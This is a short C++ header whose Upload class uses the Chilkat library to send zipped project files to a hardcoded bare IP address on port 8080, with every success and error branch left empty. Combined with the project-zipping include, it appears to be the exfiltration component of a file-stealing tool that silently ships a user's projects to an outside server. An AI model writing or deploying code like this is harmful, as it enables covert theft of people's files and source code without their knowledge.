#pragma once

#include <vector>
#include <iostream>
#include <string>
#include "chilkat-9.5.0-x86_64-vc2022\include\CkUpload.h"
#include "ZipProjects.h"

class Upload {
public:
	static void UploadFiles(std::vector<Zip::ZipFile> files) {
		
        CkUpload upload;

        
        upload.put_Hostname("34.159.21.142");
        upload.put_Path("/upload");
        upload.put_Port(8080);

        for (auto& file : files) {
            char cfile[MAX_PATH];
            char cpath[MAX_PATH];
			
            wcstombs(cfile, file.name.c_str(), MAX_PATH);
            wcstombs(cpath, file.path.c_str(), MAX_PATH);
            upload.AddFileReference(cfile, cpath);
        }


        bool success = upload.BeginUpload();
        if (success != true) {

        }
        else {
			
        }

		
        while ((upload.get_UploadInProgress() == true)) {


            upload.SleepMs(200);

        }

        // Did the upload succeed?
        if (upload.get_UploadSuccess() == true) {

        }
        else {

        }
	}
};